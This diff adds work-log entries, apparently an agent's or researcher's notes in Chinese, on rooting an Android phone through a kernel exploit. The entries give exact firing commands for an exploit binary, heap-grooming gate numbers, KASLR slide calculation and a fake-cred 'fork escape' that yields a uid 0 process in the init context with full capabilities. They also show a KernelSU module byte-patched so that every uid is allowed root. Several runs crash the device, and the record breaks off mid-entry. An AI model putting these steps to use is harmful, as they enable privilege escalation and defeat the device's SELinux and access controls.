+    若 ksu_dispatcher_nr>=0 但槽位未打补丁 -> 所有 execve 会被重定向到 ni_syscall -> 全系统 ENOSYS
+    实际所有命令正常执行 -> 只排除"半坏"状态，无法区分"正常装好"与"dispatcher_nr=-1"
+  已排除: 卡死路径（本版已绕过 stop_machine）
+
+[下一步]
+  装 ksud/manager 做功能性验证（需要 /data/adb，当前 shell 域不可写，需 relay init 域或模块侧辅助）
+  或给模块加一个可在用户态读取的自证节点（改代码，需重新编译环境）
+
+[清理]
+  未杀任何进程；probe 15761 按要求保留（fake-cred 任务，发信号会 panic）
+============================================================
+[a48] 2026-11-06 KSU 用户态通道探测（ksud 前置）→ 结论: kprobe 通道不可用
+============================================================
+[relay 能力]
+  /data/adb 已存在（内含 ADS.H56C.so ads110.bin dm38.txt k0.txt kmsg39.txt）
+  mkdir /data/adb/ksu -> 成功 ; touch /data/adb/ksu/probe_ -> 成功
+  => init 域 root 可读写 /data/adb，目录骨架能搭
+[协议来源]
+  KernelSU/uapi/supercall.h:
+    reboot(0xDEADBEEF, 0xCAFEBABE, cmd, &fd) -> 内核在 kprobe pre_handler 里装 fd
+    之后 ioctl(fd, KSU_IOCTL_GET_INFO/_GRANT_ROOT/...) 下发命令
+  kernel/supercall/supercall.c:151 ksu_supercalls_init() -> register_kprobe(&reboot_kp)
+    REBOOT_SYMBOL = "__arm64_sys_reboot"（arch.h:23）
+    整段被 #ifdef CONFIG_KSU_TRACEPOINT_HOOK 包裹
+[实测]
+  自建 aarch64 客户端 ksutest.c（NDK r27c 编译，动态链接）
+    静态版启动报 TLS underaligned（bionic 限制），改 -fPIE -pie 后正常
+  设备上执行:
+    [1] reboot(MAGIC) ret=-1 errno=1(Operation not permitted) fd=-1
+    RESULT: install fd 失败 -> 通道未建立
+  fd=-1 说明 kprobe 没有拦截/没有写回，EPERM 来自真实 reboot 系统调用（无 CAP_SYS_BOOT）
+[根因（已确证）]
+  zcat /proc/config.gz:
+    # CONFIG_KPROBES is not set
+    CONFIG_HAVE_SYSCALL_TRACEPOINTS=y
+  => register_kprobe 不可用，CONFIG_KSU_TRACEPOINT_HOOK 路径整体失效
+  => anon_inode 控制 fd 永远拿不到，ksud/manager 的 ioctl 协议在本机不存在
+[仍然可用的部分]
+  sys_call_table dispatcher 不依赖 kprobe，只依赖 tracepoint（本机 y）
+  所以 execve/setresuid/newfstatat/faccessat 四个钩子理论上仍可工作
+  即: 仅 sucompat（execve 拦截 su）这一类功能可能成立，管理面全无
+[对路线的影响]
+  原计划"装 ksud 验证"作废：没有 kprobe 就没有 ioctl 通道，装了也连不上
+  可选出路:
+    ① 内核重编开 CONFIG_KPROBES（需要完整编译环境，本机无）
+    ② 改模块，用别的方式暴露控制通道（如 misc/proc 节点），需重编
+    ③ 只保留 sucompat 的最小 root 路径，不做 manager
+[产物]
+  D:\98260\src\ksutest.c / ksutest_pie  设备 /data/local/tmp/ksutest2
+============================================================
+[a49] 2026-11-06 D 版(kk19d, sucompat 解锁) 开火 + 钩子未生效
+============================================================
+[boot]
+  boot_id 4c9eacf4 -> 新 boot（用户重启）
+  slide   0x2c1b800000   base 0xffffffd62ec00000
+[构建链]
+  kk18s6.ko -> build_kk18s10.py(0x22f9c00000 -> 0x2c1b800000, 188 ABS)
+            -> build_kk19b.py(去 stop_machine)
+            -> build_kk19d.py(两处补丁)
+  build_kk19d 关键:
+    __ksu_is_allow_uid_for_current @file 0x853c (sec_off 0x753c, size 236)
+      fd7bbea9f30b00f9 -> 20008052c0035fd6 (mov w0,#1 ; ret)
+      该处 .rela.text 条目 0 条（原脚本误按文件偏移匹配，误删了 debug 节 3 条，已修正为节内偏移且限定 sh_info==.text）
+    .rodata 0x16718 "/system/bin/su" -> "/data/adb/su"（15B 等长）
+    md5 780be373fb305a75b59ce534695936bd  3534080B
+[开火]
+  uptime 311.73 开火（>300 门槛）
+  relay 第 3 次重试成功，dirtyinit id -> uid=0 u:r:init:s0
+  init_module rc=0 errno=0，+139ms 返回
+  /proc/modules: kernelsu 147456 0 - Live (OE)
+  系统未崩，uptime 持续
+[sucompat 验证 —— 失败]
+  测试1: adb shell 'exec /data/adb/su -c id'
+         -> /system/bin/sh: /data/adb/su: inaccessible or not found
+  对照:  adb shell 'exec /data/adb/nosuch -c id'
+         -> /system/bin/sh: /data/adb/nosuch: inaccessible or not found（表现完全相同）
+  补建:  relay cp /system/bin/sh /data/adb/ksud; chmod 755
+         -rwxr-xr-x root root u:object_r:adb_data_file:s0 307792
+         再次测试 /data/adb/su -> 仍报 inaccessible or not found（与对照一致）
+  => 钩子完全没有触发；排除"ksud 缺失导致回落"这一解释
+[代码侧核查]
+  sucompat.c:157 用 ksu_is_allow_uid_for_current ✓（补丁打对）
+  sucompat.c:135 su_path[]=SU_PATH，.rodata 仅 1 处 ✓
+  init.c:107-109  CONFIG_KSU_TRACEPOINT_HOOK 分支调用
+                 ksu_syscall_hook_init(); ksu_syscall_hook_manager_init();
+  模块 symtab 确认已编入:
+    ksu_sys_enter_handler(0x247c,80) ksu_syscall_dispatcher(0x3454,104)
+    ksu_syscall_hook_manager_init(0x334,400) ksu_find_ni_syscall_slots(0x594,156)
+    tracepoint_probe_register_prio(__undef) tracepoint_reg_count/tracepoint_srcu
+[日志取证全部被封]
+  cat /proc/kallsyms            -> Permission denied（init 域也不行）
+  klogctl(READ_ALL) via uid0 通道 -> EPERM（SELinux capability syslog 拒绝）
+  /dev/kmsg 读取位置已在末尾（只能读到 106B 最新记录）
+  logcat -b kernel              -> 0 行
+  => 无法看到 "dispatcher installed at slot N" / "failed to find ni_syscall slot"
+[结论]
+  D 版加载与稳定性 OK，但 syscall 重定向链没有生效；
+  两种可能: ① ksu_syscall_hook_init 提前 return（解析 sys_call_table 或找 ni_slot 失败）
+            ② manager_init 注册 tracepoint 失败
+  两者都是静默失败（void + pr_err），而本机日志通道全封，无法区分
+[下一步选项]
+  1) 重新编译模块，加自检输出（/proc/ksu_diag 或 force pr_info），一次定位 —— 需要找到模块编译环境
+  2) 重编内核开 CONFIG_KPROBES，走官方 ksud 路径
+  3) 放弃 KSU 通道，改用自建模块直接提供 sucompat/root
+[设备残留]
+  probe 进程常驻（fake-cred, S 态）；模块 Live；通道宿主 shell 域 uid0 全 caps
+
+================================================================================
+[a50 / 纯静态排查，未开火]  2026-11-07  kk20e 定案
+================================================================================
+[核心结论：a49 不触发的根因＝manager_init 被桩死，不是 tracepoint 不存在]
+  逐版本比对 .init.text+0x334 前 8 字节（ksu_syscall_hook_manager_init 入口）：
+    kk18s6.ko            00008052c0035fd6  STUB(mov w0,#0; ret)
+    kk18s10_1296a.ko     00008052c0035fd6  STUB
+    kk19b_1296a00000.ko  00008052c0035fd6  STUB
+    kk19d_1296a00000.ko  00008052c0035fd6  STUB   <- a49 实跑版本
+    kk20a.ko             fd7bbea9f30b00f9  real(stp x29,x30,[sp,#-0x20]!; str x19,[sp,#0x10])
+    kk20b/kk20c_a/kk20d/kk20e  同上 real
+  => a49 从未执行 hooks 注册与 tracepoint 注册，handler 自然永不触发；
+     其 "inaccessible or not found" 是内核原生 ENOENT（与 /data/adb/nosuch 对照一致）。
+  kk19d 与 kk20e 的 manager_init 除上述 8 字节外整段 0x190 完全一致。
+
+[排除 tracepoint 不存在的疑点（cfg9000.txt 的 FTRACE_SYSCALLS=n 与镜像不符）]
+  vmlinux.bin BASE=0xffffffc010080000，反汇编 syscall_trace_enter @0xffffffc010164410：
+    0x1644d8  ldr x8,[x20]; tbz w8,#0xa,0x1645f8      ; TIF_SYSCALL_TRACEPOINT(bit10)
+    0x1644e4  adrp x8,0xffffffc013762000 ; add x8,#0x608  -> __tracepoint_sys_enter.key(+0x8)
+    0x1644ec  ldar w8,[x8]; cmp w8,#1; b.lt 0x1645f8   ; static key 检查
+    0x164638~ 迭代 funcs(+0x38)，步长 0x18(struct tracepoint_func)，blr x8 调 func(data,regs,id)
+    0x164600  ldr w0,[x19,#0x118]                       ; 返回 regs->syscallno（重定向落点）
+  结构体 dump @0xffffffc013762600：name 指针(唯一出现于 file 0x36e2600) ->
+    字符串 "sys_enter"；key(+0x8)=0；iter(+0x20)/regfunc(+0x28)/unregfunc(+0x30) 均非空；
+    funcs(+0x38)=NULL（未注册态，符合镜像中尚无 probe）
+  kernel/tracepoint.c: tracepoint_add_func() 首次注册时调用 tp->regfunc()
+    = syscall_regfunc -> 对所有 task set_tsk_thread_flag(TIF_SYSCALL_TRACEPOINT)
+  => 只要 tracepoint_probe_register_prio 成功，handler 对所有任务生效；a24 的 5 条 syscall
+     全 -ENOSYS 也从侧面证明该路径在本机可用。
+
+[kk20e 注册链重定位级核对（不是猜反汇编）]
+  .bss: hook 表 syscall_hooks @ .bss+0x1b8, size 0xdc8；hooked_entries @+0xb8, hooked_count @+0xb0
+  manager_init(.init.text+0x334, size 0x190) 五条 WRITE_ONCE 落点：
+    nr=147 -> hooks+0x498 (=.bss+0x650)  fn=.text 0x10b44+0x10 (setresuid)
+    nr=221 -> hooks+0x6e8 (=.bss+0x8a0)  fn=0x10b44+0x8       (execve)
+    nr=281 -> hooks+0x8c8 (=.bss+0xa80)  fn=0x10b44+0xc       (execveat)
+    nr=79  -> hooks+0x278 (=.bss+0x430)  fn=0x10b44+0x0       (newfstatat)
+    nr=48  -> hooks+0x180 (=.bss+0x338)  fn=0x10b44+0x4       (faccessat)
+    注：store 的 imm12 由 R_AARCH64_LDST64_ABS_LO12_NC(type=286) 在装载时填入，静态字节为 0。
+  +0x468/+0x46c reloc __tracepoint_sys_enter；+0x480 bl tracepoint_probe_register_prio
+    (x0=&__tracepoint_sys_enter, x2=0, w3=0x80000000)；+0x488 bl ksu_mark_running_process_locked
+  kernelsu_init：hook_init 在分支前(+0x68)；normal +0x15c / late +0x17c 都 bl manager_init
+  kk20e 已被桩函数扫描：0 个 stubbed func（相对 kk20d，ksu_register_syscall_hook 头部已恢复
+    1fe0067169000054 = cmp w0,#0x1b8; b.ls，kk20d 曾为 00008052c0035fd6）
+
+[kk20e 相对 kk19d 的 hook_init 差异（仅 3 条指令）]
+  +0x580 90000000 -> b0000000  adrp x0, ksu_observer_init
+  +0x584 91000000 -> 91040000  add  x0, x0, :lo12:(+0xa8)
+  +0x588 94000000 -> 940007fe  bl   ksu_observer_init        ; 原 printk("dispatcher installed...")
+  +0x58c e5ffff17 保持 b +0x520（含栈金丝雀收尾）
+  cave(ksu_observer_init 段, .text+0x6370, 容量 0x144)：
+    42 instr / 168 B，usage 243/324；FMT_OK@+0xa8(34B) FMT_BAD@+0xd0(35B)
+    Lbad=0x63d8(idx26) Ldone=0x6408(idx38)，分支经反汇编核验全部落点正确
+    context: adrp/add ksu_syscall_table -> ldr table; ldr w19=ksu_dispatcher_nr;
+      cbz table/越界/ldr slot[nr]/cmp slot,&ksu_syscall_dispatcher -> 打印 G-OK 或 G-BAD
+      G-BAD 时 str w10=#-1 -> ksu_dispatcher_nr（熔断：handler 首判负数即 return）
+  .rela.text: 3743 -> 3747 条（丢 12 条旧 cave，加 16 条新），移到 EOF off=0x35ed00 size=0x15f48
+  .rela.init.text: 317 -> 317 条（丢 3 条旧 printk），tail 3 条指向 ksu_observer_init
+  kk20e.ko md5=0b73b71725ec573eecd700597764c0df  size=3624008
+  baked slide=0x2dd7a00000（kk20a=0x20f5400000, kk20b=0x2229200000, kk20c*=0x2dd7a00000）
+  换 boot 必须：python build_kk18s10.py <src> <out> 0x2dd7a00000 <new_slide>
+
+[结论与一次性验证设计]
+  1) 触发器（tracepoint）存在且注册即生效 -> 方案成立，无需改直接改表/文本补丁路线。
+  2) a49 失效原因已定位为 manager_init 桩，kk20a 起已恢复，kk20e 全链无残留桩。
+  3) 唯一剩余变量：ksu_patch_text 是否真正把 slot 42 写成 dispatcher（a24 曾出现"打印 installed
+     但表项仍旧 ni"，故 kk19b 去掉 stop_machine 改本地直调；kk20e 已含此改动）。
+  4) kk20e 一次开火即可判定：G-OK -> 补丁落盘，链应通；G-BAD -> 落盘失败并自动把
+     ksu_dispatcher_nr 置 -1，全系统不会出现 ENOSYS（安全熔断），同时给出 table/nr/slot/want 四个值。
+  5) 仍未开火、未推设备、未重启。
+
+================================================================================
+[a51 / 纯静态构建，未开火] 2026-11-07 kk20f = kk20e + 出口二次哨兵 + guard ABI 修复
+================================================================================
+目的：kk20e 的哨兵只挂在 ksu_syscall_hook_init 成功路径尾部(.init.text+0x580)，
+      hook_init 在 "table==NULL" 或 "ni slot<1" 两处提前 return 时哨兵不执行。
+      kk20f 把同一哨兵再挂到 kernelsu_init 唯一出口(.init.text+0x1d8)，
+      使其成为模块 init 最后一条 printk，一次开火即可区分全部失败分支。
+
+源: kk20e.ko  md5=0b73b71725ec573eecd700597764c0df  size=3624008
+产物: kk20f.ko md5=2efb232eadba7d90a7f8cb4c4f67c14b size=3631640 (0x376a18)
+
+[改动 1] 出口挂载
+  .init.text+0x1d8  原 e0031f2a (mov w0,wzr) -> 00000094 (bl ksu_observer_init)
+  原 epilogue: +0x1cc adrp x0,__this_module; +0x1d0 add; +0x1d4 bl kobject_del;
+               +0x1d8 mov w0,wzr; +0x1dc ldr x19,[sp,#0x10];
+               +0x1e0 ldp x29,x30,[sp],#0x20; +0x1e4 ret
+  guard 自身末尾即 mov w0,#0 / ldr x19 / ldp / ret，返回值语义不变(仍返回 0)。
+  该出口是 late 与 normal 两条路径共用，且位于 ksu_hook_init 之后，覆盖全部提前 return。
+  非 MODULE/DEBUG 分支的 kobject_del 之后同样经过此处，行为一致。
+
+[改动 2] guard 寄存器 ABI 修复（关键）
+  原 guard 用 x20 暂存 sys_call_table，但 x20 是 callee-saved；挂在 +0x1d8 返回出口
+  会污染调用方 do_one_initcall 的 x20(潜在内核不稳定)。guard 内 x13 原本完全未用，
+  且为 caller-saved，故 5 处 x20 -> x13：
+    .text+0x6388  ldr x13,[x8]              (原 ldr x20,[x8])
+    .text+0x6398  cbz x13,Lbad             (原 cbz x20,Lbad)
+    .text+0x63a4  ldr x11,[x13,w19,uxtw#3] (原 [x20,...])
+    .text+0x63c0  mov x1,x13               (原 mov x1,x20)
+    .text+0x63e0  mov x1,x13               (原 mov x1,x20)
+  修复后 guard 只写 x0-x4/x8-x13(全 caller-saved) 与保存/恢复的 x19，无 callee-saved 污染。
+  该修复对 +0x580 旧挂载点同样生效(原先靠"后面不再用 x20"侥幸成立)。
+  注: 0x6418 起紧接 FMT_OK 字符串，无空间再插 push/pop，故选择换寄存器而非改栈帧。
+  guard 反汇编再验收: 0x6408 mov w0,#0; 0x640c ldr x19; 0x6410 ldp; 0x6414 ret，
+  42 instr 布局与 kk20e 完全一致，仅 5 处 Rt/Rn/Rm 字段变化。
+
+[改动 3] .rela.init.text 追加 CALL26 重定位
+  旧表: off=0x2f3a0 size=0x1db8 (317 条) —— 段内已满，无空位
+  新表: off=0x374c48 size=0x1dd0 (318 条)，位于 EOF(0x374c48..0x376a18)
+  校验: 前 317 条与原表逐字节相同 True；末条 = (off=0x1d8, sym=818, type=283, addend=0)
+        sym818 = ksu_observer_init, shndx=1(.text), st_value=0x6370
+  CALL26 跨度(文件布局) = -0x1007c 字节，远在 ±128MB 内；模块内 .text 0x1000 / .init.text 0x17214，
+  实际布局相邻，装载期 relocate 不会溢出(同模块既有 +0x160 bl ksu_observer_init 为先例)。
+
+[与 kk20e 的字节差异] 共 14 字节
+  0x7388 0x7398 0x73a4-5 0x73c2 0x73e2  (5 条 guard 指令, .text)
+  0x173ec..0x173ef                        (.init.text+0x1d8 bl)
+  0x35e2d8 0x35e2d9 0x35e2da 0x35e2e0     (sh_offset/sh_size 高位, .rela.init.text 节头)
+  其余全部与 kk20e 相同（.rela.text 3747 条未动、.init.text size 仍 0x9e0、.text size 仍 0x10cc8）
+
+[一次开火判读表(读 /dev/kmsg 尾部 "3KSU G-OK/G-BAD")]
+  G-BAD t=0            -> sys_call_table 解析失败
+  G-BAD n=-1           -> 未找到 __arm64_sys_ni_syscall 槽(或 nr 越界)
+  G-BAD s!=w           -> slot 仍是 ni，ksu_patch_text 未落盘(同时 ksu_dispatcher_nr=-1 熔断)
+  G-OK t/s/w/n 非空     -> 补丁已落盘，链路应通，可直接试 exec /data/adb/su -c id
+
+状态：仅构建与静态验收，未推设备、未加载模块、未重启、未开火。
+首轮 build 曾发现 sh_offset 指向"仅 1 条"的错误(旧 317 条未随迁)，已改为整表搬到 EOF 并重建。
+
+================================================================================
+[a52 / 开火 2026-11-07] kk20g(=kk20f 按当前 slide 重烘) 第 1 波特，6 次 attempt 全被几何/slabdata 闸拦
+================================================================================
+[开火前状态]
+  boot_id df8f0952-0885-42c5-a6c8-81442ee40dd5  uptime 9914s  enforcing=1
+  /proc/modules 无 kernelsu
+  relay: am instrument --user 15 InvokeRoot -> "Guarded handler invoked once"
+         ./dirtyinit id -> uid=0(root) gid=0 context=u:r:init:s0  RC=0
+  KASLR: tracing_on=1; sh kaslr_self.sh ->
+         raw_values=5 hits=3 slide16=00000017de600000
+         slide=0x17de600000 base=0xffffffd7ee600000
+  => kk20f 烘的 0x2dd7a00000 与本 boot 不符，必须重烘
+
+[重烘] python build_kk18s10.py kk20f.ko kk20g.ko 0x2dd7a00000 0x17de600000
+  relocated ABS symbols: 188  delta=-0x15f9400000
+  ksu_patch_text symidx=896 val=0x2dc0
+  runtime misc_list=0xffffffd7f1bc7860
+  payload len=60 (17 instr) DEAD=0x6a8
+  relocations in-range=14 (all -> DEAD 0x6a8)
+  md5 139260ad2e951107325156f8a943d0a8  size 3631640
+  校验: selinux_state 0xffffffd7f1f4ae68 = 0xffffffc01394ae68 + 0x17de600000 ✓
+        init_task     0xffffffd7f1788280 = 0xffffffc013188280 + 0x17de600000 ✓
+        __tracepoint_sys_enter 0xffffffd7f1d62600 (= 0xffffffc013762600 + slide) ✓
+        .init.text+0x1d8 = 00000094 (bl guard) 保留
+        .rela.init.text 318 条，末条 (0x1d8, sym818, type283, add 0) 保留
+        与 kk20f 差异 568B：全在 .symtab ABS(188*~3B) + init.text+0x630 段 payload 里的
+        misc_list 立即数(0x1784d/0x1784e/0x17850/0x17851)，无其他改动
+  push: /data/local/tmp/kk20g.ko 3631640B，设备 md5 139260ad2e951107325156f8a943d0a8 ✓
+
+[开火命令]
+  cd /data/local/tmp && ./wr93a26 -I -U FCIMPX -m /data/local/tmp/kk20g.ko -t -W \
+      -s 0x17de600000 -n 631 -p 60 -g 8 -y 1200 -a 6
+  日志: d:\98260\logs\a52_fire.log
+  B0c slide=0x17de600000 cred_cs=0xffffffd7ee7e38d4 timer_cs=0xffffffd7ee8bf748
+      task_cs=0xffffffd7ee7930a8 self_tid=11051
+  [B1] cred records=2 va=0xffffff83a3a3e600 | probe_task records=1 va=0xffffff83afbf4b00
+  [B1c] [2] 0xffffff8180620780 | [207] 0xffffff83a3a3e600 delta=0x22341de80
+  [B6] fillers ready=6 [CDEFBA] | [R0b] oom=-1000 cgroup=[8:groupsched:/default]
+
+[6 次 attempt 数值（全部弃用，未进入 victim 破坏阶段）]
+  att1 victim=11091 tid=11092 recs=644 okc=631 多=13 满30=8/22 arm_i=120 alias=12 -> 几何脏
+  att2 victim=11111 tid=11112 recs=632 多=1 非满组=1 满30=20/22 arm=29 ->
+       [B7] posix_timers_cache 1110/1110/272/30/2 slabdata=37 > 33 -> slabdata 闸
+  att3 victim=11140 tid=11141 recs=631 满30=21/22 arm=29 -> slabdata=41 > 33 -> 闸
+  att4 victim=11165 tid=11166 recs=631 满30=21/22 arm=29 -> slabdata=45 > 33 -> 闸
+  att5 victim=11198 tid=11199 recs=645 okc=631 多=14 满30=7/22 arm=29 alias=14 -> 几何脏
+  att6 victim=11214 tid=11215 recs=631 满30=21/22 arm=29 -> slabdata=53 > 33 -> 闸
+  == VERDICT: 6 次尝试全部未拿到 (hit+discard)
+  每次 attempt 的 [B2h] 空洞填充器分别造 142+29 / 149 / 120 / 120 / 120 / 120 个 timer，
+  filler 进程数 2->7，slabdata 逐轮抬升 37->41->45->53（与历史 a18 结论一致，+5/轮）
+
+[开火后状态（未崩、shell 存活）]
+  uptime 9914 -> 10290+ 持续增长，boot_id 不变（未重启）
+  posix_timers_cache 990/1080 slabdata=36（>33 闸门）
+  /proc/modules 无 kernelsu（模块未加载）
+  adb shell / relay 均正常，未 kill 任何进程
+
+[附加（误触）]
+  一条 `./wr93a26 -h` 不支持，等价于无参启动 probe 模式（cred+0x4，-P 绝对写）：
+    slide auto=0x17de600000（与实测一致，反向印证 slide）
+    [B1] cred 0xffffff810369ef00 | probe_task 0xffffff811a015dc0
+    attempt1.. 均被"几何脏"弃用（recs 631/631 满30=16, arm_i=58 alias=0）
+
+[结论]
+  1) kk20g 本体、slide、重定位、payload、设备 md5 全部正确；本波特失败纯粹是
+     posix_timers_cache 基线已被抬到 36（闸门 33），同 boot 内无法自愈（历史 a18 已验证）。
+  2) 历史规律: fresh boot 基线 slabdata=6，开火后 ~32 可过闸；一 boot 一枪。
+  3) 下一步需重启复位 slabdata 后尽早上枪（重启需用户同意）。
+
+============================================================
+[a53/a54] 2026-11-07 kk21 = kk20h 按当前 boot slide 用 bake_ko2 重烘 · 模块首次无 panic 加载
+============================================================
+[环境] boot_id 5372201a-ddc0-4edb-991c-f424c3a32523 | 开火前 uptime 1306s | tracing_on=1（relay 置 1）
+[slide 实测] kaslr_self.sh 两次一致
+  第1次 raw_values=4 hits=3 → slide=0x2835200000 base=0xffffffe845200000
+  第2次 raw_values=3 hits=3 → slide=0x2835200000 base=0xffffffe845200000
+[烘焙] python bake_ko2.py kk20h.ko kk21.ko 0x1a04600000 0x2835200000
+  imm_sites=1 syms=188 delta=0xe30c00000
+  .init.text +0x0640 val=0xffffffda17bc7860 -> 0xffffffe8487c7860（= panic 地址-8，修复点）
+  md5=0dd4b2d5c15e9f78053479b8934090dd size=3631640
+[静态校验]
+  ABS 188 条 min=0xffffffe845287a6c max=0xffffffe848b4ae68；stale-old-slide=0
+  printk 0xffffffe845467c98（nominal 0xffffffc010867c98 + slide ✓）
+  kallsyms_lookup_name 0xffffffe8454e8efc ✓ | kern_path 0xffffffe8457238c8 ✓
+  file_wrapper_init 立即数 7860/487c/ffe8/ffff → 0xffffffe8487c7860 ✓
+  .rela.init.text 318 条（末条 +0x1d8 保留）| .rela.text 3747 条
+  与 kk20h 差异 568B = 4B 立即数 + 188*3B symtab，无其它改动
+[推送] /data/local/tmp/kk21.ko 3631640B 设备 md5 一致
+[闸] 开火前 posix_timers slabdata=6 ≤33；/proc/modules 无 kernelsu
+
+[a53 第一次开火] -a 6
+  基线 slabdata=6 → attempt1 几何脏（recs=632/631 满30=19/22 arm_i=89 alias=1）
+  attempt2 slabdata=37 > 33 闸；attempt3 45；attempt4 49；attempt5 53 → 6 次全弃用，模块未加载
+  清理 wr93a26 子孙后 slabdata 36 → 12（回收后门限恢复）
+[a54 第二次开火] -a 5（同 boot，未重启）
+  attempt 1/5: WINDOW HIT | timers=631 holes=0 recs=631 slabs=22 last_slab=4143540
+    arm_i=89 | GATE=PASS（target pfn 本进程 UNMOVABLE=1, 本进程任意=1, 任意进程=1）
+    alloc_round=2 free_cnt=2 | B20/B21/B22 uhid 134/135 repair pwrite=128 errno=0 → STAGE1 桥就绪
+  [F] probe pid=23184 fake_cred=0xffffff8139f37100 sid=68 u:r:init:s0
+  [U] 放行 probe init_module(kk21.ko) 预读 3631640/3631640
+  [结果] kernelsu 147456 0 - Live 0x0000000000000000 (OE)  ← 模块加载成功，未 panic
+[开火后]
+  uptime 1410 → 1786 持续增长，boot_id 不变；slabdata 清理后 12；无 wr93a26 残留
+[未取到的证据]
+  dmesg_restrict=1；shell 域（含 uid0 u:r:shell:s0 通道）读 dmesg 与 /dev/kmsg 全 EPERM；
+  ro.logd.kernel=false（logcat kernel 缓冲为空）；relay 的 dmesg 仅取新记录
+  → 本枪 G-OK/G-BAD、phys/ret 未采集；su 验证受阻：/data/adb/su 对 shell 域不可达（SELinux）
+[结论]
+  1) bake_ko2 的立即数平移修复了连续重启：新 slide 下模块完整 init、Live，设备稳定 >370s。
+  2) 同 boot 内 slabdata 可通过 kill 残余 wr93a26 回收到 12，无需重启即可二次开火（本次已证明）。
+  3) 待办：G-OK/G-BAD 需可落盘日志；否则在 BAD 路径主动 panic 借 console-ramoops 取日志（需用户同意重启）。
+
+================================================================
+[a56] 2026-11-07 12:11 重启后（用户指令：重启再开火，重新算 slide）
+  boot_id=55084452-89a0-47a8-b114-fd6a22831468  uptime 0min
+  KASLR 重算：本 boot tracing_on 原为 0，需先 echo 1 > /sys/kernel/tracing/tracing_on
+    kaslr_self: raw_values=4 hits=3 slide16=000000145c800000
+    slide=0x145c800000  base=0xffffffd46c800000（写入 /data/local/tmp/kaslr_base）
+  wr93b md5=4a462a5237e41fbe445e43a50167a521 size=2356720（带 errno comm 诊断）
+  slabdata(pre)=6
+  a56 开火失败：[B0b] relay: connect(@dfi_init): Connection refused
+    → 新 boot relay 未拉起，[B1] cred/task records=0，probe task 泄漏失败，未进入 attempt
+  处置：am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot
+    → result=Guarded handler invoked once；./dirtyinit id → uid=0 u:r:init:s0
+[a57] 同 boot（uptime≈4min）开火：-I -U FCFORK -t -W -s 0x145c800000 -n 631 -p 60 -g 8 -y 1200 -a 2，SIDFIX=68
+  slabdata(pre)=6；STAGE1 桥就绪；probe=17842 fake_cred=0xffffff82d0cef100 tsec=0xffffff82d0cef1c0
+  sid=68；task->pid/tgid<-0 rc=0；avc slots[276] → fake_list 0xffffff82d0cef218
+  +0ms comm='wpAAAAAAABBBBBB' state=R；+2ms comm='FC_PARENT' state=S → fork 逃逸成功
+  escape child pid=18005 ppid=17842 uid=0 euid=0 gid=0 ctx=u:r:init:s0 CapEff=000001ffffffffff State=S
+  comm 编码 errs=7e,00,00,00（/data/adb=ENOKEY(126)；/data/misc/perfetto-traces 成功）
+  输出文件 /data/misc/perfetto-traces/fc_fork.txt（shell:shell 0644，1313B，shell 可直接 cat）
+  payload 关键结果：
+    - /proc/modules 读取 EACCES(13)
+    - /dev/kmsg open+SEEK_SET(0) OK：bytes=262170 lines=2232 hit=0（本 boot 未加载 kernelsu，符合预期）
+    - enforce: before='1'；write '0' ret=-1 errno=22(EINVAL)；after='1'（华为 harden 确认）
+    - /data/adb 读 dir 得 12 条密文名（base64 形，FBE 密钥不在该 cred keyring）→ stat su/ksud/ksu 均 ENOENT
+    - /sys/module/kernelsu、/dev/kernelsu 均 MISSING（本 boot 未上模块）
+  slabdata(post)=15；boot 未变，uptime 持续增长，无 panic
+[结论]
+  1) fork 逃逸路线成立：不 exec、不进 shell 域，子进程保持 u:r:init:s0 + uid0 + 全 caps，且常驻。
+  2) 关键突破：/dev/kmsg 可 SEEK_SET(0) 全环回读（262KB/2232 行），补齐此前 G-OK/G-BAD 无法采集的通道。
+  3) 落盘通道：/data/misc/perfetto-traces 可写并被 shell 直读（/data/adb 因 FBE 密钥不可用报 ENOKEY）。
+  4) enforce 写入仍 EINVAL（华为 selinux harden），不要指望 setenforce 0。
+  5) 下步（需重烘 kk 到 slide 0x145c800000）：-I 加载模块后用逃逸子进程读 kmsg 取 G-OK/G-BAD。
+
+=== [a58~a62] 2026-11-07 fork 逃逸 + 模块加载 + G-OK/G-BAD 实采 ===
+[boot#1] 12:21 boot_id 55084452-89a0-47a8-b114-fd6a22831468 slide=0x145c800000
+  a58: -a 2, attempt1 WINDOW HIT, B15 GATE=FAIL -> PARKED (slabdata 6->15); 约+4min 设备 panic 重启(-I 污染延迟踩踏,同 a39)
+[boot#2] 12:26 boot_id 15e36b1b-32fe-4600-acb4-2e0d56eabd2c slide=0x1e62e00000 base=0xffffffde72e00000
+  kk23 md5=5a1be7d19c1bb957217d4dc9f5a8ac6d (kk21->0x1e62e00000, imm 0xffffffde763c7860)
+  a59 -a 6: attempt1 GATE=PASS, misc_list=0xffffffde763c7860 (与烘焙 imm 一致)
+    probe 16574 uid0: FC_CALL->FC_OK0 @+137ms, FC_DONE @+2228ms
+    /proc/modules: kernelsu 147456 0 - Live 0x0000000000000000 (OE)  <-- 模块加载成功
+    逃逸子 16705: uid=0 ctx=u:r:init:s0 CapEff=000001ffffffffff
+      out=/dev/fc_fork.txt errs=7e,7e,00,00 (/data/adb 与 perfetto 均 ENOKEY)
+      /dev/kmsg SEEK_SET(0) 读回 0 字节; /proc/modules EACCES(13)
+    约 +7min 设备 panic 重启
+[boot#3] 12:44 boot_id 1c4837a0-d5d1-4867-9186-f556ac4ee025 slide=0x1109c00000 base=0xffffffd119c00000
+  kk25 md5=f674553a06f15bc6e9152871214409b9 (kk21->0x1109c00000, imm 0xffffffd11d1c7860)
+  a60 -a 6: 全部未拿到; slabdata 6->36 (>33); kill 后 36->13
+  a61 -a 4: 全部未拿到
+  a62 -a 4: attempt1 GATE=PASS, STAGE1 就绪, FC_CALL->FC_OK0 @+166ms
+    /proc/modules: kernelsu 147456 0 - Live 0x0000000000000000 (OE)
+    逃逸子 klogctl(READ_ALL) 100ms 轮询 60s 命中:
+      <3>[19990.067016s] [pid:0,cpu5,FC_CALL,9]KSU G-BAD t=ffffffd11c815258 n=42 s=ffffffd11beac738 w=ffffffd103bfe454
+      <3>[19990.100769s] [pid:0,cpu5,FC_CALL,8]KSU G-BAD t=ffffffd11c815258 n=-1 s=0000000000000000 w=ffffffd103bfe454
+      <3>[19990.126007s] [pid:0,cpu5,FC_CALL,1]KSU G-BAD t=ffffffd11c815258 n=-1 s=0000000000000000 w=ffffffd103bfe454
+    判读:
+      t=0xffffffd11c815258 = base+0x2c15258 = sys_call_table (syms_shift 0xffffffc012c15258 R sys_call_table) 解析成功
